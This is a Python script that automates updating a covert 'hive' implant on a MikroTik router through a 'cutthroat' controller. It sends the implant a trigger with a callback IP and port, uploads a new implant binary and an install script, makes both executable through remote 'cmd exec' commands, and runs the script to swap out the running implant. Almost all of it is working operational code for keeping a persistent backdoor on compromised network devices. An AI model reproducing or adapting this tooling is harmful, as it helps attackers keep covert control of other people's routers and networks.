#!/usr/bin/python

import pexpect, sys, os, time, exceptions
from datetime import datetime

'''

    USAGE:	./update_MT_Hive.py <remoteIP>
 
                         MT=mikrotik
 
    Currently, the second argument should be the IP address of the hive implant you 
    want to trigger and update on a mikrotik device...

	NOTE:  A second argument will automatically overwrite any file with that second name...
    
    EXAMPLE:
	./update_MT_Hive.py 10.2.9.6

    DEPENDENCIES:
	Python with pexpect...
	Fully functional cutthroat with hive ILM
	A "hiveMTConfiguration.py" file will require less user input...

'''

if len(sys.argv) != 2:
        print
        print "     USAGE: "+sys.argv[0]+ " implant_IP_Address"  # [e.g. 10.1.2.3]
        print
        sys.exit()
else:
        remoteIP_fileName = sys.argv[1]
        if os.path.isfile("hiveMTConfiguration.py"):
		pass
	else:
                print "\n\n   No Hive Configuration file found, so you'll have to answer some questions...\n\n"
                remoteIP_fileName = sys.argv[1]
                print 'remoteIP_fileName= '+remoteIP_fileName
                #Get input parameters...
                callbackIP = raw_input('What is your callback IP address? ')
                callbackPort = raw_input('What is your callback port? ')
                triggerProtocol = raw_input('Which trigger protocol [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]? ')
                remotePort = 0
		if triggerProtocol == "raw-udp":
                        remotePort =  raw_input('What remote port will you be using? ')
                elif triggerProtocol == "raw-tcp":
                        remotePort =  raw_input('What remote port will you be using? ')
		#oldImplantName = "hived-mikrotik-mipsbe-PATCHED"
		oldImplantName = raw_input('What is the name of the old hive implant? ')
                #newImplantName = "hived-mikrotik-mipsbe-PATCHED"
		newImplantName = raw_input('What is the name of the new hive implant? ') 
                #implantDirectory = "/rw/pckg/"
		implantDirectory = raw_input('Where was the old implant installed? ')   
                #installationScript = "install_MT_script"
		installationScript = raw_input('What is the name of the installation script? ') 
		#
		#    Create the hiveMTConfiguration.py file...
		#
		configFile = open("./hiveMTConfiguration.py", "w")
		configFile.write('#!/usr/bin/python\n')
		configFile.write('# Filename: hiveMTConfiguration.py\n')
		configFile.write('\n')
		configFile.write("callbackIP = \""+callbackIP+"\"\n")
		configFile.write('#callbackPort must be in the 1-65535 range\n')
		configFile.write("callbackPort = \""+callbackPort+"\"\n")
		configFile.write('#triggerProtocol = [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]\n')
		configFile.write("triggerProtocol = \""+triggerProtocol+"\"\n")
		configFile.write('#if triggerProtocol == "raw-udp" or "raw-tcp", remotePort must be in the 1-65535 range\n')
		configFile.write('remotePort = '+str(remotePort)+'\n') 
		configFile.write('\n')
		configFile.write("oldImplantName = \""+oldImplantName+"\"\n")
		configFile.write("newImplantName = \""+newImplantName+"\"\n")
		configFile.write("implantDirectory = \""+implantDirectory+"\"\n")
		configFile.write("installationScript = \""+installationScript+"\"\n")
		configFile.write('\n')
		configFile.write('# End of hiveMTConfiguration.py\n')
		configFile.close()

if os.path.isfile("hiveMTConfiguration.py"):
	print "Reading from hiveMTConfiguration.py"
	from hiveMTConfiguration import *

#Delete the file if it exists now for convenience...
if os.path.isfile(remoteIP_fileName):
        print "\n\n\n Deleting file " + remoteIP_fileName + " for now...       Use this later to decide how to proceed!!\n\n\n"
        os.remove(remoteIP_fileName)

remoteIP = remoteIP_fileName

#           Pexpect starts cutthroat
#
#          ./cutthroat ./hive
#
#
#Starts cutthroat and displays the initial startup
commandLine="./cutthroat ./hive"
print "Trying to spawn "+commandLine
global cutT
cutT = pexpect.spawn(commandLine)
now=datetime.now()
fileName="cutthroat_terminal_"+now.strftime('%Y%m%d_%H%M%S.')+"log"
fout = file(fileName, 'w')
cutT.logfile=fout

index = cutT.expect( ['> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )

if index == 0:
	print "Matched first index of \>"
	print cutT.before
	print cutT.after
elif index == 1:
	print "FAILED MATCH: Desired match did not occur..."
       	print cutT.before
       	print cutT.after
elif index == 2:
	print "Timeout of "+timeoutValue+" occurred."
       	print cutT.before
       	print cutT.after


#pattern="['> ', pexpect.EOF, pexpect.TIMEOUT]"
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#
# 
#     Common interface command for three pattern term matching...
#
#     Index 0: Always use the desired matching term for the first value in the pattern.
#        Index 1 corresponds to pexpect.EOF
#        Index 2 corresponds to pexpect.TIOMEOUT
#
def cut_3_interface( patternA, timeoutValue, referenceContent):
	try:
		cutT.expect( patternA )
		if index == 0:
			print referenceContent+": Good match where patternA=<"+patternA+">"
		#print cutT.before   #before and after used for first log
		#print cutT.after    #Only used in 2nd log
		print cutT.before    #Only used in 3rd log...
	except pexpect.EOF:
		print "FAILED MATCH: Desired match did not occur..."
        	print cutT.before
        	print cutT.after
	except pexpect.TIMEOUT:
		print "Timeout of "+timeoutValue+" occurred."
        	print cutT.before
        	print cutT.after

	#index = cutT.expect( patternX , timeout=timeoutValue )
	#print "Looking for pattern <"+patternX+">"
	#if index == 0:
	#	print "Matched"
	#	print cutT.before
	#	print cutT.after
	#elif index == 1:
	#	print "FAILED MATCH: Desired match did not occur..."
        #	print cutT.before
        #	print cutT.after
	#elif index == 2:
	#	print "Timeout of "+timeoutValue+" occurred."
        #	print cutT.before
        #	print cutT.after
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


#pattern="['> ', pexpect.EOF, pexpect.TIMEOUT]"
#cut_3_interface( pattern, 20)

print "Starting connect sequence."
#
#
#            ilm connect ${remoteIP}
#
#
#connection='ilm connect 10.2.9.6'
connection='ilm connect '+remoteIP_fileName+''
cutT.sendline(connection)

#This section assumes the remoteIP file does not exist so it prompts the user for input...


index = cutT.expect( ['\? ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
	print cutT.before
elif index == 1:
	print "EOF occurred"
      	print cutT.before
      	print cutT.after
elif index == 2:
	print "Timeout of 20 occurred"
	print cutT.before
	print cutT.after



#cutT.sendline('  10.3.2.19')    #callback address
cutT.sendline('  '+callbackIP)    #callback address

patternA="\?"
cut_3_interface( patternA, 20, "callbackIPsent")


cutT.sendline('  '+callbackPort)        #callback port
cut_3_interface( patternA, 20, "callbackPortsent")

#cutT.sendline("  10.2.9.6")    #remote IP Address
cutT.sendline('  '+remoteIP)    #remote IP Address
cut_3_interface( patternA, 20, "remoteIPsent")

#cutT.sendline("  dns-request")
cutT.sendline('  '+triggerProtocol)

if (triggerProtocol == "raw-udp") or (triggerProtocol == "raw-tcp"):
	cut_3_interface( patternA, 15, "rawTriggersent")
	cutT.sendline('  '+str(remotePort))


#
#
#      Sends the trigger...
#
#
index = cutT.expect( [' Trigger sent.', '> ', pexpect.EOF, pexpect.TIMEOUT] , timeout=20 )
if index == 0:
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Sent on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Matched >, raw-tcp post on remote host could not be reached..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 200 occurred"
        print cutT.before
        print cutT.after

print "\n\n Waiting... \n\n"
response="\["+remoteIP+"\]> "
#index = cutT.expect( ['Success', 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=200 )

if index == 0:
        print "Received response."
        print cutT.before
        print cutT.after
elif index == 1:
        print "Failure occurred"
        print cutT.before
        print cutT.after
elif index == 2:
        print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
        print "Timeout occurred. "
	now=datetime.now()
	print "      Trigger Timed out on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
        print cutT.before
        print cutT.after
	print "FAILED INITIAL TRIGGER RESPONSE"
	sys.exit()

#cutT.sendline("  file put hived-mikrotik-mipsbe-PATCHED /rw/pckg/newhive")
ctCommand= "  file put "+newImplantName+" "+implantDirectory+"newhive"
cutT.sendline(ctCommand)
#
#
#      Sends the updated hive...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "Received response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Updated hive sent as newhive on "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 30 occurred"
        print cutT.before
        print cutT.after




#  This line is specific to mikrotik routers for now...
#cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/newhive\"")
ctCommand= "  cmd exec \"chmod 755 "+implantDirectory+"newhive\""
cutT.sendline(ctCommand)
#
#
#      Makes the newhive executable...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "newhive executable response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      Updated newhive is executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 200 occurred"
        print cutT.before
        print cutT.after

#  The following line is specific to mikrotik routers for now...
#cutT.sendline("  file put installScript /rw/pckg/installScript")
ctCommand= "  file put "+installationScript+" "+implantDirectory+"installScript"
cutT.sendline(ctCommand)
#
#
#      Sends the installScript...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "installScript installed response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      installScript is put on device at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 30 occurred"
        print cutT.before
        print cutT.after


#  This line is specific to mikrotik routers for now...
#cutT.sendline("  cmd exec \"chmod 755 /rw/pckg/installScript\"")
ctCommand= "  cmd exec \"chmod 755 "+implantDirectory+"installScript\""
cutT.sendline(ctCommand)
#
#
#      Makes the installScript executable...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [response, 'Failure', pexpect.EOF, pexpect.TIMEOUT] , timeout=30 )

if index == 0:
        print "installedScript executable response."
        print cutT.before
        print cutT.after
	now=datetime.now()
	print "      installScript is now executable at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
elif index == 1:
	print "Failed..."
        print cutT.before
        print cutT.after
elif index == 2:
	print "EOF occurred"
        print cutT.before
        print cutT.after
elif index == 3:
	print "Timeout of 30 occurred"
        print cutT.before
        print cutT.after



#  This line is specific to mikrotik routers for now...
now=datetime.now()
#cutT.sendline("  cmd exec /rw/pckg/installScript")
ctCommand= "  cmd exec "+implantDirectory+"installScript"
cutT.sendline(ctCommand)
#
#
#      Runs the installScript ...    Note that the hive trigger should now timeout
#                                      since the install script should remove 
#                                      all currently running hive processes including
#                                      our currently triggered implant and replace the
#                                      existing hive with the new hive implant...
#
#
response="\["+remoteIP+"\]> "
index = cutT.expect( [ pexpect.TIMEOUT, response, 'Failure', pexpect.EOF] , timeout=60 )

if index == 0:
        print "Expected timeout occurred since the existing hive is currently being replaced..."
        print cutT.before
        print cutT.after
	print "      installScript was started at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs"
	now=datetime.now()
        print "      Hive should have been replaced by now at "+now.strftime('%m/%d/%Y at %H:%M:%S')+" hrs after 60 seconds timeout."
elif index == 1:
	print "Should never have gotten here for a response...  ERROR   ERROR  ERROR"
        print cutT.before
        print cutT.after
elif index == 2:
	print "Should never have gotten here for a Failure...  ERROR   ERROR  ERROR"
        print cutT.before
        print cutT.after
elif index == 3:
	print "EOF occurred"
        print cutT.before
        print cutT.after


print "\n\n End of cutInterface.py\n\n"

